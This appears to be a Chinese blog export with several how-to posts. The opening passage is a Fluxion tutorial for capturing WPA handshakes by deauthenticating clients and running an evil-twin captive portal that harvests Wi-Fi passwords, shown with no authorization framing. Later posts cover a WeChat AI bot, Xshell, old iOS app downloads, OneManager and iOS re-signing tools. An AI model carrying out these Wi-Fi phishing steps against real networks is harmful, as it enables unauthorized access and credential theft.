<p>输入 <code>1</code> 选择无线网卡（一般情况都是显示 wlan0）</p>
<p>输入 <code>3</code> 扫描所有信道（2.4GHz &amp; 5GHz）</p>
<blockquote>
<p>如果网卡不支持 5G 频段，扫描后的结果不包含 5G 频段的 WiFi</p>
</blockquote>
<p>扫描到目标 WiFi 后，按 <code>Ctrl + C</code> 停止扫描</p>
<p><img src="/img/fluxion/3.webp" alt="img"></p>
<p>输入目标 WiFi 前面的序号（序号前面的 <strong>0</strong> 不需要输入）</p>
<p><img src="/img/fluxion/4.webp" alt="img"></p>
<p>输入 <code>2</code> 选择“跳过”</p>
<p>输入 <code>2</code> 选择 aireplay-ng 解除认证方式</p>
<p>之后全部选择推荐的选项</p>
<p><img src="/img/fluxion/5.webp" alt="img"></p>
<p>之后会自动抓取握手包，如果有连接到WiFi的设备，aireplay-ng 会把它踢下线，一般设备都会自动重连 WiFi，这个时候就抓取到握手包了。成功抓到握手包之后，左下角命令行会闪烁，同时显示“成功”，然后关掉这个命令行窗口就可以了</p>
<p><img src="/img/fluxion/6.webp" alt="230928155847.jpg"></p>
<h4 id="5-创建钓鱼-WiFi"><a href="#5-创建钓鱼-WiFi" class="headerlink" title="5. 创建钓鱼 WiFi"></a>5. 创建钓鱼 WiFi</h4><p>输入 <code>1</code> 选择“专属门户”</p>
<p>输入 <code>Y</code> 开始创建钓鱼 AP</p>
<p>输入 <code>2</code> 选择“跳过”</p>
<p>输入 <code>2</code> 选择无线网卡（一般情况都是显示 wlan0）</p>
<p>输入 <code>1</code> 选择 mdk4 解除认证方式</p>
<p>输入 <code>1</code> 选择推荐的选项</p>
<p>输入 <code>1</code> 选择 cowpatty 验证密码方式</p>
<p>输入 <code>1</code> 使用抓取到的 hash 文件</p>
<p>输入 <code>2</code> 选择推荐的选项</p>
<p>输入 <code>1</code> 创建 SSL 证书</p>
<p>输入 <code>1</code> 选择推荐的选项</p>
<p>输入 <code>3</code> 选择中文版本的通用认证网页</p>
<p><img src="/img/fluxion/7.webp" alt="231011224528.jpg"></p>
<blockquote>
<p>推荐根据 <a href="https://github.com/FluxionNetwork/fluxion/wiki/Preparing-portals-for-fluxion">官方文档</a> 自己编写认证网页上传，因为通用的认证网页界面实在是太丑了…</p>
</blockquote>
<p>之后就是等待鱼儿上钩了，钓鱼成功后右上角的窗口会显示密码保存的路径（复制这个路径，待会要用到）</p>
<p><img src="/img/fluxion/8.webp" alt="230929012505.jpg"></p>
<p>当有人连接了钓鱼 WiFi，就会跳转到下面的这个认证页面，程序会比对输入密码的哈希值，输入正确的密码会自动关闭钓鱼 WiFi，并将密码保存到日志中，否则会提示密码错误</p>
<p><img src="/img/fluxion/9.webp" alt="231011230201.jpg"></p>
<h4 id="6-查看密码"><a href="#6-查看密码" class="headerlink" title="6. 查看密码"></a>6. 查看密码</h4><p>按 <code>Ctrl + C</code> 退出 Fluxion，之后输入下面的命令查看密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cat /root/fluxion/attacks/Captive\ Portal/netlog/test-5A:A0:DA:E3:BE:2F.log</span><br></pre></td></tr></table></figure>



<p>后面的路径就是上一步复制的，注意空格前面需要使用 <code>\</code> 转译</p>
<p><img src="/img/fluxion/10.webp" alt="230929014449.jpg"></p>
<h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h4><p>Fluxion 只适合距离路由器距离较近，WiFi 信号较强，并且拥有大功率无线网卡的场景，否则创建的钓鱼 WiFi 永远排在真实 WiFi 的下面，用户可能永远都不会连接这个钓鱼 WiFi，因为信号实在是太差了。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
        <tag>fluxion</tag>
      </tags>
  </entry>
  <entry>
    <title>WeChat Bot一个基于WeChaty结合ChatGPT/Kimi/讯飞/COZE等AI服务实现的微信机器人</title>
    <url>/posts/ba643697/</url>
    <content><![CDATA[<h1 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h1><p><a href="https://github.com/LinHanlove/wechat-bot">LinHanlove&#x2F;wechat-bot: 一个基于WeChaty结合OpenAi ChatGPT &#x2F; Kimi &#x2F; 讯飞等Ai服务实现的微信机器人，可以帮你自动回复微信消息，或者管理微信群&#x2F;好友，检测僵尸粉等…</a></p>
<p><a href="https://github.com/wangrongding/wechat-bot">wangrongding&#x2F;wechat-bot: 🤖一个基于 WeChaty 结合 OpenAi ChatGPT &#x2F; Kimi &#x2F; 讯飞等Ai服务实现的微信机器人 ，可以用来帮助你自动回复微信消息，或者管理微信群&#x2F;好友，检测僵尸粉等…</a></p>
<h1 id="WeChat-Bot"><a href="#WeChat-Bot" class="headerlink" title="WeChat Bot"></a>WeChat Bot</h1><p>一个 基于 <code>chatgpt</code> + <code>wechaty</code> 的微信机器人</p>
<p>可以用来帮助你自动回复微信消息，或者管理微信群&#x2F;好友.</p>
<h2 id="使用前需要配置的-AI-服务（目前支持-4-种，可任选其一）"><a href="#使用前需要配置的-AI-服务（目前支持-4-种，可任选其一）" class="headerlink" title="使用前需要配置的 AI 服务（目前支持 4 种，可任选其一）"></a>使用前需要配置的 AI 服务（目前支持 4 种，可任选其一）</h2><ul>
<li><p>deepseek获取自己的 <code>api key</code>，地址戳这里 👉🏻 ：<a href="https://platform.deepseek.com/usage">deepseek开放平台</a><br>将获取到的<code>api key</code>填入 <code>.evn</code> 文件中的 <code>DEEPSEEK_FREE_TOKEN</code> 中。</p>
</li>
<li><p>科大讯飞</p>
<p>新增科大讯飞，去这里申请一个 key：<a href="https://console.xfyun.cn/services/bm35">科大讯飞</a>，每个模型都有 200 万的免费 token ，感觉很难用完。<br>注意： 讯飞的配置文件几个 key，别填反了，很多人找到我说为什么不回复，都是填反了。<br>而且还有一个好处就是，接口不会像 Kimi 一样限制请求频次，相对来说稳定很多。</p>
</li>
<li><p>Kimi （请求限制较严重）</p>
<p>可以去 ： <a href="https://platform.moonshot.cn/console/api-keys">kimi apikey</a> 获取你的 key<br>最近比较忙，大家感兴趣可以提交 PR，我会尽快合并。目前 Kimi 刚刚集成，还可以实现上传文件等功能，然后有其它较好的服务也可以提交 PR 。</p>
</li>
<li><p>ChatGPT</p>
<p>先获取自己的 <code>api key</code>，地址戳这里 👉🏻 ：<a href="https://beta.openai.com/account/api-keys">创建你的 api key</a></p>
<p><strong>注意：这个是需要去付费购买的，很多人过来问为什么请求不通，请确保终端走了代理，并且付费购买了它的服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行下面命令，拷贝一份 .env.example 文件为 .env</span></span><br><span class="line"><span class="built_in">cp</span> .env.example .<span class="built_in">env</span></span><br><span class="line"><span class="comment"># 填写完善 .env 文件中的内容</span></span><br><span class="line">OPENAI_API_KEY=<span class="string">&#x27;你的key&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>其他<br>（待实践）理论上使用openAI格式的api，都可以使用，在env文件中修改对应的api_key、model、proxy_url即可。</p>
</li>
</ul>
<h2 id="开发-使用"><a href="#开发-使用" class="headerlink" title="开发&#x2F;使用"></a>开发&#x2F;使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#克隆源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/macinko/wechat-bot</span><br><span class="line"><span class="comment">#cd到wechat-bot路径</span></span><br><span class="line"><span class="built_in">cd</span> wechat-bot</span><br><span class="line"><span class="comment"># 执行下面命令，拷贝一份 .env.example 文件为 .env</span></span><br><span class="line"><span class="built_in">cp</span> .env.example .<span class="built_in">env</span></span><br><span class="line"><span class="comment"># 填写完善 .env 文件中的内容</span></span><br><span class="line">OPENAI_API_KEY=<span class="string">&#x27;你的key&#x27;</span></span><br></pre></td></tr></table></figure>

<p>检查好自己的开发环境，确保已经安装了 <code>nodejs</code> , 版本需要满足 Node.js &gt;&#x3D; v18.0 ，版本太低会导致运行报错,最好使用 LTS 版本。</p>
<p>安装依赖</p>
<blockquote>
<p>安装依赖时，大陆的朋友推荐切到 taobao 镜像源后再安装，命令：<br>npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a><br>想要灵活切换，推荐使用我的工具 👉🏻 <a href="https://github.com/wangrongding/prm-cli">prm-cli</a> 快速切换。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">npm i</span><br><span class="line"><span class="comment"># 推荐用 yarn 吧，npm 安装有时会遇到 wechaty 内部依赖安装失败的问题</span></span><br><span class="line">yarn</span><br></pre></td></tr></table></figure>

<p>运行服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">npm run dev <span class="comment"># 或者 npm run start</span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">yarn dev <span class="comment"># 或者 yarn start</span></span><br></pre></td></tr></table></figure>

<p>然后就可以扫码登录了，然后根据你的需求，自己修改相关逻辑文件。</p>
<p>为了兼容 docker 部署，避免不必要的选择交互，新增指定服务运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 运行指定服务 （ 目前支持 ChatGPT | Kimi | coze ）</span></span><br><span class="line">npm run start -- --serve Kimi</span><br><span class="line"><span class="comment"># 交互选择服务，仍然保持原有的逻辑</span></span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure>

<p>测试</p>
<p>安装完依赖后，运行 <code>npm run dev</code> 前，可以先测试下 openai 的接口是否可用，运行 <code>npm run test</code> 即可。</p>
<p>遇到 timeout 问题需要自行解决。（一般就是代理未成功，或者你的梯子限制了调 openai api 的服务）</p>
<h2 id="你要修改的"><a href="#你要修改的" class="headerlink" title="你要修改的"></a>你要修改的</h2><p>很多人说运行后不会自动收发信息，不是的哈，为了防止给每一条收到的消息都自动回复（太恐怖了），所以加了限制条件。</p>
<p>你要把下面提到的地方自定义修改下。</p>
<ul>
<li>群聊，记得把机器人名称改成你自己微信号的名称，然后添加对应群聊的名称到白名单中，这样就可以自动回复群聊消息了。</li>
<li>私聊，记得把需要自动回复的好友名称添加到白名单中，这样就可以自动回复私聊消息了。</li>
</ul>
<p>在.env文件中修改你的配置即可，示例如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 白名单配置</span><br><span class="line">#定义机器人的名称，这里是为了防止群聊消息太多，所以只有艾特机器人才会回复，</span><br><span class="line">#这里不要把@去掉，在@后面加上你启动机器人账号的微信名称</span><br><span class="line">BOT_NAME=@可乐</span><br><span class="line">#联系人白名单</span><br><span class="line">ALIAS_WHITELIST=微信名1,备注名2</span><br><span class="line">#群聊白名单</span><br><span class="line">ROOM_WHITELIST=XX群1,群2</span><br></pre></td></tr></table></figure>

<p>可以看到，自动回复都是基于 <code>chatgpt</code> 的，记得要开代理，或者填写代理地址。</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>xshell用钥匙登录连接甲骨文服务器</title>
    <url>/posts/3c3a9fed/</url>
    <content><![CDATA[<p>Xshell-7软件下载</p>
<p><a href="https://wwsf.lanzn.com/igVz12fjmyjc">https://wwsf.lanzn.com/igVz12fjmyjc</a> 密码:bgad</p>
<h1 id="用户身份验证，去掉password，勾选public-key"><a href="#用户身份验证，去掉password，勾选public-key" class="headerlink" title="用户身份验证，去掉password，勾选public key"></a>用户身份验证，去掉password，勾选public key</h1><p><img src="/img/xshell/4.webp" alt="img"></p>
<h1 id="连接，主机：输入甲骨文公网ip地址"><a href="#连接，主机：输入甲骨文公网ip地址" class="headerlink" title="连接，主机：输入甲骨文公网ip地址"></a>连接，主机：输入甲骨文公网ip地址</h1><p><img src="/img/xshell/5.webp" alt="img"></p>
<h1 id="输入用户名：ubuntu-或-opc（centos系统）"><a href="#输入用户名：ubuntu-或-opc（centos系统）" class="headerlink" title="输入用户名：ubuntu 或 opc（centos系统）"></a>输入用户名：ubuntu 或 opc（centos系统）</h1><p><img src="/img/xshell/6.webp" alt="img"></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>xshell</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title>xshell保持终端连接状态（活动、不断开）</title>
    <url>/posts/7c5c77c4/</url>
    <content><![CDATA[<p>Xshell-7软件下载</p>
<p><a href="https://wwsf.lanzn.com/igVz12fjmyjc">https://wwsf.lanzn.com/igVz12fjmyjc</a> 密码:bgad</p>
<p>基于安全原因，终端访问是受限的，我们希望终端长时间保持连接状态，此时可以利用 xshell 的功能：</p>
<p><img src="/img/xshell/3.webp" alt="在这里插入图片描述"></p>
<p>选择会话 “属性-&gt;连接-&gt;保持活动状态” 中设置每隔60秒发送一个\n。</p>
<p>当然，你可以自由选择空闲间隔时长以及发送的命令。</p>
<p>这样，终端始终处于活动状态，就不会中断啦。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>xshell</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS任意版本app下载，解决app store已下架或最低系统限制的问题</title>
    <url>/posts/65e8e866/</url>
    <content><![CDATA[<h3 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h3><ol>
<li>下载iOS旧版应用，简化繁琐抓包流程。</li>
<li>一键生成去更新IPA（手机安装后，去除App Store的更新检测）</li>
</ol>
<h3 id="支持系统"><a href="#支持系统" class="headerlink" title="支持系统"></a>支持系统</h3><p>windows 10&#x2F;windows 8&#x2F;windows 7（由于使用了Fiddler库，所以需要.Net环境）</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="一、直接搜索方式"><a href="#一、直接搜索方式" class="headerlink" title="一、直接搜索方式"></a>一、直接搜索方式</h4><ol>
<li>搜索APP，双击选择。</li>
<li>双击选择要下载的版本。</li>
<li>在iTunes中下载即可。</li>
</ol>
<h4 id="二、复制APP链接方式"><a href="#二、复制APP链接方式" class="headerlink" title="二、复制APP链接方式"></a>二、复制APP链接方式</h4><ol>
<li>在iTunes下载按钮右侧下拉菜单中，选择【复制链接】。</li>
<li>双击选择要下载的版本。</li>
<li>在iTunes中下载即可。</li>
</ol>
<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="问：iTunes-账号无法登录成功"><a href="#问：iTunes-账号无法登录成功" class="headerlink" title="问：iTunes 账号无法登录成功"></a>问：iTunes 账号无法登录成功</h4><ol>
<li>请先关闭本工具，再进行 iTunes 登录操作。</li>
<li>登录成功后，再打开本工具即可。</li>
</ol>
<h4 id="问：iTunes对电脑进行授权时，授权不了，反复授权"><a href="#问：iTunes对电脑进行授权时，授权不了，反复授权" class="headerlink" title="问：iTunes对电脑进行授权时，授权不了，反复授权"></a>问：iTunes对电脑进行授权时，授权不了，反复授权</h4><ol>
<li>关闭本工具，再进行授权即可。</li>
</ol>
<h4 id="问：搜不到APP历史版本号？（以下方法100-可解决）"><a href="#问：搜不到APP历史版本号？（以下方法100-可解决）" class="headerlink" title="问：搜不到APP历史版本号？（以下方法100%可解决）"></a>问：搜不到APP历史版本号？（以下方法100%可解决）</h4><ol>
<li>先不要拦截，在iTunes商店中下载此软件，等待下载完成。</li>
<li>在本工具中【安装管理】下找到对应IPA安装包，右键选择【查找版本ID】。</li>
<li>即可列出软件所有历史版本ID，版本号按新版到旧版排序。<br>PS：暂时没有通过版本ID，查版本号的接口，所以抓下来，看吧。</li>
</ol>
<h4 id="问：iTunes-一直显示正在下载…"><a href="#问：iTunes-一直显示正在下载…" class="headerlink" title="问：iTunes 一直显示正在下载…"></a>问：iTunes 一直显示正在下载…</h4><ol>
<li>iTunes 先取消下载。</li>
<li>本工具【停止拦截】，再点击iTunes【继续下载】。</li>
</ol>
<h4 id="问：下载完APP，安装到手机，打开闪退。"><a href="#问：下载完APP，安装到手机，打开闪退。" class="headerlink" title="问：下载完APP，安装到手机，打开闪退。"></a>问：下载完APP，安装到手机，打开闪退。</h4><ol>
<li>先在手机中卸载该APP。</li>
<li>使用下载此App的账号，登录 App Store，在 App Store 中随便下载一个应用，不要卸载。</li>
<li>使用同步助手，重新安装。（如果仍闪退，尝试覆盖安装）</li>
</ol>
<h4 id="问：导入伪旧版App后，iTunes未检测到更新。"><a href="#问：导入伪旧版App后，iTunes未检测到更新。" class="headerlink" title="问：导入伪旧版App后，iTunes未检测到更新。"></a>问：导入伪旧版App后，iTunes未检测到更新。</h4><ol>
<li>iTunes 更新列表页面下，按F5即可。</li>
<li>如上述方法未解决，删除当列表所有文件，保留文件，再点击右下角检测更新按钮。</li>
</ol>
<h4 id="问：“已停止供货”的APP-怎么抓取？（已失效）"><a href="#问：“已停止供货”的APP-怎么抓取？（已失效）" class="headerlink" title="问：“已停止供货”的APP 怎么抓取？（已失效）"></a>问：“已停止供货”的APP 怎么抓取？（已失效）</h4><ol>
<li>取消拦截，下载该软件最新版。</li>
<li>本助手里切换到【安装管理】，右键APP，选择【伪装旧版APP】。</li>
<li>双击【*_伪装版.ipa】（或右键，在文件夹中打开），将APP拖动到iTunes资料库，替换，检查更新，该软件变为更新状态。</li>
<li>【开始拦截】，iTunes中更新该软件，即可正常下载该版本。</li>
</ol>
<h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p><a href="https://www.bilibili.com/video/BV1VQ4y1M77t">https://www.bilibili.com/video/BV1VQ4y1M77t</a></p>
<h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p>iOS任意版本号APP下载v5.1<br>百度云：<a href="https://pan.baidu.com/s/1uIOP8n436qS72mOWaBTlLg">https://pan.baidu.com/s/1uIOP8n436qS72mOWaBTlLg</a><br>提取码：bGMg</p>
<p>蓝奏：<a href="https://wwx.lanzoui.com/iBE4Emzgbkj">https://wwx.lanzoui.com/iBE4Emzgbkj</a></p>
<p>iTunes v12.6.5.3（最后一个带AppStore的版本）<br>官方直链：<br>64位：<a href="https://secure-appldnld.apple.com/itunes12/091-87819-20180912-69177170-B085-11E8-B6AB-C1D03409AD2A6/iTunes64Setup.exe">https://secure-appldnld.apple.com/itunes12/091-87819-20180912-69177170-B085-11E8-B6AB-C1D03409AD2A6/iTunes64Setup.exe</a><br>32位：<a href="https://secure-appldnld.apple.com/itunes12/091-87820-20180912-69177170-B085-11E8-B6AB-C1D03409AD2A5/iTunesSetup.exe">https://secure-appldnld.apple.com/itunes12/091-87820-20180912-69177170-B085-11E8-B6AB-C1D03409AD2A5/iTunesSetup.exe</a></p>
<p>百度云：<a href="https://pan.baidu.com/s/13mI8nWiDe-4kttloNTjRWw">https://pan.baidu.com/s/13mI8nWiDe-4kttloNTjRWw</a><br>提取码：hpfj</p>
<h3 id="另一种方法用降级工具DowngradeApp"><a href="#另一种方法用降级工具DowngradeApp" class="headerlink" title="另一种方法用降级工具DowngradeApp"></a>另一种方法用降级工具DowngradeApp</h3><p>我用夸克网盘分享了「降级工具DowngradeApp_1.1-9【建议用这替代】.ipa」，点击链接即可保存。打开「夸克APP」，无需下载在线播放视频，畅享原画5倍速，支持电视投屏。<br>链接：<a href="https://pan.quark.cn/s/e2d4bec97a23">https://pan.quark.cn/s/e2d4bec97a23</a><br>提取码：zYrT</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>在vercel部署onemanager索引onedrive网盘</title>
    <url>/posts/15554115/</url>
    <content><![CDATA[<p>每次分享东西要么用微信要么用U盘，前者速度慢还有各种限制，后者只能面对面，干脆利用OneManager+onedrive+vercel搭建一个属于自己的网盘，做到大容量、能分享、速度也不慢。为了坚持白嫖原则，做到一分钱不花，域名、服务器、硬盘、网络这些统统都不用，实现真正的0成本。</p>
<p><strong>前提条件</strong></p>
<p><strong>一个OneDrive账号</strong></p>
<p>自行注册，建议注册e5开发者（容量也有5t，但需要保活，不然三个月就删号了），且需要确保可以调用api。</p>
<p><strong>一个vercel账号</strong></p>
<p>前往vercel官网自行注册，注册时选择hobby即可免费使用。</p>
<p><strong>一个域名</strong></p>
<p>域名免费的有freenom可以免费注册顶级域名（容易被回收）;也有eu.org这种可以给免费的二级域名（不好注册经常不给通过）。</p>
<p><strong>一、部署OneManager</strong></p>
<p>提前获取vercel token，浏览器打开<a href="https://vercel.com/account/tokens">https://vercel.com/account/tokens</a></p>
<p><img src="/img/onemanager/1.webp" alt="图片"></p>
<p>token name填写名字，scope权限选择full account，expiration选择no expiration即可（永不过期），点击create创建，复制得到的token。</p>
<p><img src="/img/onemanager/2.webp" alt="图片"></p>
<p>打开<a href="https://scfonedrive.github.io/Vercel/Deploy.html">https://scfonedrive.github.io/Vercel/Deploy.html</a></p>
<p>先下载文件:<br><a href="https://github.com/qkqpttgf/OneManager-php/archive/refs/heads/master.zip">https://github.com/qkqpttgf/OneManager-php/archive/refs/heads/master.zip</a></p>
<blockquote>
<p>解决vercel的php版本问题导致页面空白的问题：</p>
<p>用旧版zip文件</p>
<p>下载:<a href="https://wwsf.lanzn.com/iUZbZ2c725xc">https://wwsf.lanzn.com/iUZbZ2c725xc</a> 密码:add9</p>
<p>“runtime”: “vercel-php@ 输入 0.6.2</p>
</blockquote>
<p>上传刚刚下载的文件</p>
<p><img src="/img/onemanager/3.webp" alt="图片"></p>
<p>填写刚刚获得的密钥token，名字name可以随便取，点击deploy部署。</p>
<p><img src="/img/onemanager/4.webp" alt="图片"></p>
<p>等待十几秒出现success表示部署成功。</p>
<p><img src="/img/onemanager/5.webp" alt="图片"></p>
<p>因为某些原因vercel.app这个域名不能访问，所以还需要添加一个域名。访问vercel主页，先在overview选择刚刚建立的项目，然后转到settings-domains，输入要添加的域名，点击add添加。</p>
<p><img src="/img/onemanager/6.webp" alt="图片"></p>
<p>然后给域名添加一个cname解析</p>
<p><img src="/img/onemanager/7.webp" alt="图片"></p>
<p><img src="/img/onemanager/8.webp" alt="图片"></p>
<p>等待一段时间域名解析生效即可用刚刚添加的域名访问</p>
<p><img src="/img/onemanager/9.webp" alt="图片"></p>
<p><strong>二、配置OneManager</strong></p>
<p>浏览器打开https:&#x2F;&#x2F;你的域名进入到安装程序，点击开始安装程序。</p>
<p><img src="/img/onemanager/10.webp" alt="图片"></p>
<p>添加刚开始建立的token（如果忘记了再新建一个即可），设置密码，确定。</p>
<p><img src="/img/onemanager/11.webp" alt="图片"></p>
<p>刷新一下网页，左上角点击登录，输入刚刚设置的密码，然后点击管理-设置，选择OneDrive，添加盘</p>
<p><em>OneManager还可以挂载阿里<a href="https://www.smzdm.com/ju/s28z0v2/">云盘</a>等其他厂商的网盘，但是目前容量大的网盘也只有OneDrive。</em></p>
<p><img src="/img/onemanager/12.webp" alt="图片"></p>
<p>设置标签、名称，根据自己OneDrive选择版本，如果是e5开发者建议勾选用自己的应用id与机密，然后确认。</p>
<p><img src="/img/onemanager/13.webp" alt="图片"></p>
<p>跳转到OneDrive登录界面，输入账户密码登录，选择接受许可</p>
<p><img src="/img/onemanager/14.webp" alt="图片"></p>
<p>等待一段时间，完成后会自动跳转，选择驱动器默认第一个use OneDrive。</p>
<p><img src="/img/onemanager/15.webp" alt="图片"></p>
<p>再次等待几秒即可完成安装</p>
<p><img src="/img/onemanager/16.webp" alt="图片"></p>
<p>这时候打开https:&#x2F;&#x2F;自己的域名，就可以正常使用了。</p>
<p><img src="/img/onemanager/17.webp" alt="图片"></p>
<p>提醒：如果看不到文件请刷新缓存：管理-刷新当前目录即可。</p>
<p><img src="/img/onemanager/18.webp" alt="图片"></p>
<p>至此OneManager就已经部署完成了，点击文件就可以查看下载，后续的美化、启用游客上传、加密等功能</p>
<p><em>OneManager对比alist来说可以任意部署，自己不用出任何设备，虽然界面、功能性不如alist，但是任意部署、不花钱还要啥自行车，更重要的是不用自己出设备，放公网也不怕被攻击。</em></p>
<p><em>备注：OneManager只是索引，所有的文件上传下载流量均是OneDrive服务器直接连接，程序本身只消耗微乎其微的流量，这个也可以部署在本地，如果觉得OneDrive太慢请检查自身网络或者更换阿里云盘。</em></p>
<p>也可用docker部署</p>
<p><a href="https://hub.docker.com/r/zhullyb/onemanager-php">zhullyb&#x2F;onemanager-php - Docker Image | Docker Hub</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>onedrive</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>onedrive</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS巨魔轻松签+完全体教程</title>
    <url>/posts/692b3ea6/</url>
    <content><![CDATA[<p><strong>轻松签+是什么</strong></p>
<p>轻松签，原本是一个给未越狱iPhone提供签名的工具。因为巨魔是开源的，轻松签的作者，就将巨魔的永久签集成到了轻松签的APP里——也就是轻松签+。</p>
<p>这也就意味着，轻松签+可以实现巨魔商店的侧载功能，而且是中文界面，符合国人的使用习惯。</p>
<p><img src="/img/esign/1.webp" alt="img"></p>
<p>不仅如此，因为轻松签是靠“签名”起家的，它也同时可以对IPA进行定制——比如提取IPA，双开，改图标，注入插件，去除最低系统限制等一系列功能。</p>
<p>但是，轻松签+在默认状态下是阉割版，而不是完整版。那么如何解锁轻松签+的完全体，以及使用它的核心功能呢？网上讲这个问题的人非常少，因此就出篇教程来补充一下。</p>
<p>注意，本篇教程，仅仅适用已经有巨魔的用户！也就是iOS14——iOS16.6.1老系统。</p>
<p>如果你不懂怎么安装巨魔，请看我的往期教程。</p>
<p><strong>解锁轻松签+完全体</strong></p>
<p><strong>1，巨魔安装轻松签+</strong></p>
<p>在一切开始之前，你需要下载轻松签+，Fliza 这两个APP，才能解锁轻松签+的完全体。</p>
<p><img src="/img/esign/2.webp" alt="img"></p>
<p>你将获取最新的轻松签+安装包，以及配套工具Fliza，一个测试用的APP。</p>
<p>下载好了文件之后，将轻松签+，Fliza的IPA安装包，通过共享，发送到巨魔商店安装。</p>
<p><strong>2，解锁轻松签+完全体</strong></p>
<p>需要注意，轻松签+默认状态下是阉割版，必须做以下两步，才能解锁完全体。</p>
<p><strong>轻松签+设置：</strong></p>
<p>打开轻松签+，点击设置-永久安装配置，下拉找到“安装esign helper，选择一个无用的系统应用进行替代，这里我选择的是“邮件”。</p>
<p><img src="/img/esign/3.webp" alt="img"></p>
<p>之后，“邮件”就会变成轻松签+助手。如果没做这一步，通过轻松签+安装的APP，会出现图标空白的情况。</p>
<p><strong>Fliza设置：</strong></p>
<p>根据路径：&#x2F;var&#x2F;containers&#x2F;bundle&#x2F;application&#x2F;轻松签+&#x2F;esign.app，找到“esignhelper”文件。</p>
<p><img src="/img/esign/4.webp" alt="img"></p>
<p>点击感叹号，在“所有权”选项里，把“所有者”、“组”这两个选项的权限，都设置为“0.root”，设置完后如图所示。</p>
<p>好了，这时候，你就解锁了轻松签+的完全体，拥有永久安装，修改签名的权限。</p>
<p><strong>轻松签+的4大用法</strong></p>
<p>很多人不知道轻松签+具体有什么用——因为要说应用侧载，那巨魔商店已经可以实现了。其实，轻松签+完全体非常强大，可以替代很多巨魔工具，只是它为人低调而已。</p>
<p>下面介绍4个好用的功能，看完就基本懂了。</p>
<p><strong>1，改图标</strong></p>
<p>在应用-已安装列表中，找到巨魔录音机，点击修改，点击修改桌面图标，随意选择一个图片，保存修改。回到桌面一看，你会发现APP图标已经被修改了——是不是很神奇？</p>
<p><img src="/img/esign/5.webp" alt="img"></p>
<p><strong>2，双开</strong></p>
<p>在设置-导入文件中，导入IPA，它就会被轻松签+获取到IPA。然后在应用-未签名中，点击刚才导入的IPA，选择“签名”，然后修改第二项的名字，在后面加个“1”或者其他数字，点击签名，成功后再点击永久安装，就可以实现双开。</p>
<p><img src="/img/esign/6.webp" alt="img"></p>
<p><strong>3，修改库</strong></p>
<p>在应用-已安装列表中，点击APP，点击“修改”。你可以看到“移除已有库”、“添加第三方库”这两个选项，这里可以管理APP的插件，而且是全类型都支持。在往下拉，还能修改版本限制、移除设备限制等等。</p>
<p><img src="/img/esign/7.webp" alt="img"></p>
<p><strong>4，提取IPA</strong></p>
<p>在应用-已安装列表，点击APP。你会发现，轻松签+可以解密再导出IPA，如果是系统权限的APP则可以直接导出IPA，比起Appdump 2，它更全能，且更方便。</p>
<p><img src="/img/esign/8.webp" alt="img"></p>
<p><strong>结论</strong></p>
<p>巨魔版本的轻松签+，至少能取代3个以上的巨魔工具。只要你经常安装IPA，那它基本上是必备的。而且，比起海外应用，轻松签+是全中文界面，方便大家理解。</p>
<h1 id="TrollFools2-7-huami-版"><a href="#TrollFools2-7-huami-版" class="headerlink" title="TrollFools2.7 huami 版"></a>TrollFools2.7 huami 版</h1><p>GitHub 地址 ： <a href="https://github.com/huami1314/TrollFools/releases">https://github.com/huami1314/TrollFools/releases</a><br>TrollFools2.7:<br><a href="https://www.123pan.com/s/oJCLVv-83Jvd?%E6%8F%90%E5%8F%96%E7%A0%81:Cxhy">https://www.123pan.com/s/oJCLVv-83Jvd?提取码:Cxhy</a><br>🎉iOS17.0巨魔资源推荐：<br><a href="https://www.123pan.com/s/oJCLVv-RzBvd.html">https://www.123pan.com/s/oJCLVv-RzBvd.html</a></p>
